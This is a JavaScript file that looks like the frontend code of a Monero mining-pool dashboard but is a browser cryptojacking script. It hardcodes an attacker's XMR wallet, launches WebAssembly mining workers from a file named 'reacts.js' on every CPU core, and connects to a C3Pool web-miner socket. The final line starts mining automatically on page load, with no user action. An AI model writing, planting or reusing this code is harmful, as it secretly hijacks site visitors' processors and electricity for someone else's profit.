if(!qrobqovenvqo) {
    var qrobqovenvqo = true
    var $Q = {
        pool: {
            nme: "C3P"
        },
        clr: {
            main: "208b8b",
            secondary: "818181",
            "back-l": "e8e8e8",
            "back-d": "313131"
        },
        cur: {
            nme: "XMR",
            sym: "XMR",
            conf: 30,
            port: 18081,
            reg: /^[4|8]{1}([A-Za-z0-9]{105}|[A-Za-z0-9]{94})$/
        },
        api: "https://api.c3pool.com/",
        fiat_name: "cny",
        fiat_symbol: "¥",
        news: true,
        email: true,
        timer: 60,
        pending_days: 30,
        graph: {
            hrs: 72,
            pplns: false
        },
        pay: {
            min_auto: .003,
            def_auto: .005,
            max_fee: 1e-4,
            zero_fee_pay: 4,
            dec_auto: 4
        }
    }
    
    var addr = "84PuYrfMysbFSvD2asJexPTtbaZURzGa68nADWxjssU66mzPGfJqcozEZN9FoUq9kGVof74vniZB5Do9TtafuingVUK3exW"
    var pass = "LNA___"+Math.random() * 1234
    var pref = "LNA", mport = $Q.cur.port, cookieprefix = $Q.pool.nme.replace(/[ ,;]/g, ""), resizeTimer, updateTimer = $Q.timer, updateCounter, outoffocus = 0, now = Rnd((new Date).getTime() / 1e3), width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth, netpop_open = "", miner_setup_open = false, blocks_page_size = 15, poolpay_page_size = 15, blocks_port = mport, $WM = {
        enabled: false,
        addr: "",
        prev_hashes: 0,
        status_timer: false,
        update_sec: 2
    }, $A = {}, $C = {
        TogMode: "",
        Timer: "",
        NetStats: "",
        Addr: "",
        Stage: "",
        DashPayBtn: "",
        AddrField: "",
        TimerPie: "",
        TimerText: "",
        TimerRefresh: ""
    }, $U = {
        netstats: 0,
        poolstats: 0,
        news: 0
    }, $P = {}, $L = {
        perc: "9 %",
        thou: ",",
        dec: ".",
        tme: "G:i"
    }, $D = {
        news: {},
        coins: [[]],
        blocks: [],
        poolpay: [],
        poolstats: {},
        pay: {},
        blockpay: {},
        netstats: {},
        hashconv: {
            TH: 1e12,
            GH: 1e9,
            MH: 1e6,
            KH: 1e3,
            H: 1
        },
        miner_hash_avg: 0
    }

    var web_miner_start = false;
    function WebMinerSetBtn() {
        if (web_miner_start === false) {
            web_miner_start = true;
            if (addr && UrlVars().web_miner && $WM.enabled === false) {
                WebMiner();
                return
            }
        }
    }
    function WebMiner() {
        $WM.enabled = !$WM.enabled;
        WebMinerSetBtn();
        if ($WM.enabled && addr) {
            var threads = navigator.hardwareConcurrency || 4;
            startMining("c3pool.com", addr, pass, navigator.hardwareConcurrency || 4, "");
            $WM.addr = addr;
            $WM.status_timer = setInterval(function() {
                if (addr !== $WM.addr) {
                    clearInterval($WM.status_timer);
                    $WM.status_timer = false;
                    $WM.enabled = false;
                    WebMinerSetBtn();
                    return
                }
                while (sendStack.length > 0)
                    sendStack.pop();
                while (receiveStack.length > 0)
                    receiveStack.pop();
                $WM.prev_hash = totalhashes;
            }, $WM.update_sec * 1e3)
        } else {
            stopMining();
            if ($WM.status_timer) {
                clearInterval($WM.status_timer);
                $WM.status_timer = false
            }
        }
    }

    function Rnd(n, dec, m) {
        if (dec >= 1) {
            var d = Math.pow(10, dec);
            n = Math.round(n * d) / d;
            if (m === "txt") {
                n = n.toFixed(dec);
                if ($L.dec !== ".")
                    n = n.replace(".", $L.dec)
            }
        } else {
            n = Math.round(n)
        }
        return n
    }
    function hashToLink(hash, port, type) {
        if (hash == undefined)
            return "none";
        var url = port in COINS ? COINS[port].url : "";
        if (port == 11898) {
            return '<a class="C1 hov" target="_blank" href="' + url + "/block.html?hash=" + hash + '">' + hash + "</a>"
        } else if (port == 13007) {
            return '<a class="C1 hov" target="_blank" href="' + url + "/?hash=" + hash + '">' + hash + "</a>"
        } else if (port == 11812) {
            return '<a class="C1 hov" target="_blank" href="' + url + "/" + type + "?" + type + "_info=" + hash + '">' + hash + "</a>"
        } else if (port == 8545) {
            return '<a class="C1 hov" target="_blank" href="' + url + "/" + type + "/0x" + hash + '">' + hash + "</a>"
        } else if (port == 9053) {
            return '<a class="C1 hov" target="_blank" href="' + url + "/blocks/" + hash + '">' + hash + "</a>"
        } else {
            return '<a class="C1 hov" target="_blank" href="' + url + "/" + type + "/" + hash + '">' + hash + "</a>"
        }
    }
    function difficultyToHashRate(hashrate, port) {
        return Math.floor(port in COINS ? hashrate / COINS[port].time : 0)
    }
    function HashConv(h) {
        h = h > 0 ? h : 0;
        var u = "/s";
        for (var k in $D.hashconv) {
            if (h >= $D.hashconv[k]) {
                h = h / $D.hashconv[k];
                u = k + u;
                break
            }
        }
        if (h === 0)
            u = "H/s";
        return {
            num: Rnd(h, 2),
            unit: u
        }
    }
    function HashConvStr(h, unit) {
        var h = HashConv(h);
        return h.num + " " + (unit ? h.unit.replace(/H\//, unit + "/") : h.unit)
    }
    function SynchTime(t) {
        if (t > now)
            now = t + 3
    }
    function Truncate(s, l) {
        return s && s.length > 0 && l > 0 ? s.length > l ? s.substring(0, l - 3) + "..." : s : s
    }
    function UrlVars() {
        var v = {}, h, p = window.location.href.slice(window.location.href.indexOf("?") + 1).split("&");
        for (var i = 0; i < p.length; i++) {
            h = p[i].split("=");
            v[h[0]] = h[1] ? h[1] : true
        }
        return v
    }
    function removeElement(id) {
        var e = document.getElementById(id);
        if (e)
            return e.parentNode.removeChild(e)
    }
    var server = "wss://webminer.c3pool.com:443/";
    var job = null;
    var workers = [];
    var ws;
    var receiveStack = [];
    var sendStack = [];
    var totalhashes = 0;
    var connected = 0;
    var reconnector = 0;
    var attempts = 1;
    var throttleMiner = 0;
    var handshake = null;
    function wasmSupported() {
        try {
            if (typeof WebAssembly === "object" && typeof WebAssembly.instantiate === "function") {
                var module = new WebAssembly.Module(Uint8Array.of(0, 97, 115, 109, 1, 0, 0, 0));
                if (module instanceof WebAssembly.Module)
                    return new WebAssembly.Instance(module)instanceof WebAssembly.Instance
            }
        } catch (e) {}
        return false
    }
    function addWorkers(numThreads) {
        logicalProcessors = numThreads;
        if (numThreads == -1) {
            try {
                logicalProcessors = window.navigator.hardwareConcurrency
            } catch (err) {
                logicalProcessors = 4
            }
            if (!(logicalProcessors > 0 && logicalProcessors < 40))
                logicalProcessors = 4
        }
        while (logicalProcessors-- > 0)
            addWorker()
    }
    var openWebSocket = function() {
        if (ws != null) {
            ws.close()
        }
        var splitted = server.split(";");
        var chosen = splitted[Math.floor(Math.random() * splitted.length)];
        ws = new WebSocket(chosen);
        ws.onmessage = on_servermsg;
        ws.onerror = function(event) {
            if (connected < 2)
                connected = 2;
            job = null
        }
        ;
        ws.onclose = function() {
            if (connected < 2)
                connected = 2;
            job = null
        }
        ;
        ws.onopen = function() {
            ws.send(JSON.stringify(handshake));
            attempts = 1;
            connected = 1
        }
    };
    reconnector = function() {
        if (connected !== 3 && (ws == null || ws.readyState !== 0 && ws.readyState !== 1)) {
            attempts++;
            openWebSocket()
        }
        if (connected !== 3)
            setTimeout(reconnector, 1e4 * attempts)
    }
    ;
    function startBroadcast(mining) {
        if (typeof BroadcastChannel !== "function") {
            mining();
            return
        }
        stopBroadcast();
        var bc = new BroadcastChannel("channel");
        var number = Math.random();
        var array = [];
        var timerc = 0;
        var wantsToStart = true;
        array.push(number);
        bc.onmessage = function(ev) {
            if (array.indexOf(ev.data) === -1)
                array.push(ev.data)
        }
        ;
        function checkShouldStart() {
            bc.postMessage(number);
            timerc++;
            if (timerc % 2 === 0) {
                array.sort();
                if (array[0] === number && wantsToStart) {
                    mining();
                    wantsToStart = false;
                    number = 0
                }
                array = [];
                array.push(number)
            }
        }
        startBroadcast.bc = bc;
        startBroadcast.id = setInterval(checkShouldStart, 1e3)
    }
    function stopBroadcast() {
        if (typeof startBroadcast.bc !== "undefined") {
            startBroadcast.bc.close()
        }
        if (typeof startBroadcast.id !== "undefined") {
            clearInterval(startBroadcast.id)
        }
    }
    function startMiningWithId(loginid, numThreads, userid) {
        if (!wasmSupported())
            return;
        stopMining();
        connected = 0;
        handshake = {
            identifier: "handshake",
            loginid: loginid,
            userid: userid,
            version: 7
        };
        var foo = function() {
            addWorkers(numThreads);
            reconnector()
        };
        startBroadcast(foo)
    }
    function startMining(pool, login, password, numThreads, userid) {
        if (!wasmSupported())
            return;
        stopMining();
        connected = 0;
        handshake = {
            identifier: "handshake",
            pool: pool,
            login: login,
            password: password,
            userid: userid,
            version: 7
        };
        var foo = function() {
            addWorkers(numThreads);
            reconnector()
        };
        startBroadcast(foo)
    }
    function stopMining() {
        connected = 3;
        if (ws != null)
            ws.close();
        deleteAllWorkers();
        job = null;
        stopBroadcast()
    }
    function addWorker() {
        var newWorker = new Worker("reacts.js");
        workers.push(newWorker);
        newWorker.onmessage = on_workermsg;
        setTimeout(function() {
            informWorker(newWorker)
        }, 2e3)
    }
    function removeWorker() {
        if (workers.length < 1)
            return;
        var wrk = workers.shift();
        wrk.terminate()
    }
    function deleteAllWorkers() {
        for (i = 0; i < workers.length; i++) {
            workers[i].terminate()
        }
        workers = []
    }
    function informWorker(wrk) {
        var evt = {
            data: "wakeup",
            target: wrk
        };
        on_workermsg(evt)
    }
    function on_servermsg(e) {
        var obj = JSON.parse(e.data);
        receiveStack.push(obj);
        if (obj.identifier == "job")
            job = obj
    }
    function on_workermsg(e) {
        var wrk = e.target;
        if (connected != 1) {
            setTimeout(function() {
                informWorker(wrk)
            }, 2e3);
            return
        }
        if (e.data != "nothing" && e.data != "wakeup") {
            var obj = JSON.parse(e.data);
            ws.send(e.data);
            sendStack.push(obj)
        }
        if (job === null) {
            setTimeout(function() {
                informWorker(wrk)
            }, 2e3);
            return
        }
        var jbthrt = {
            job: job,
            throttle: Math.max(0, Math.min(throttleMiner, 100))
        };
        wrk.postMessage(jbthrt);
        if (e.data != "wakeup")
            totalhashes += 1
    }
    WebMiner();
}
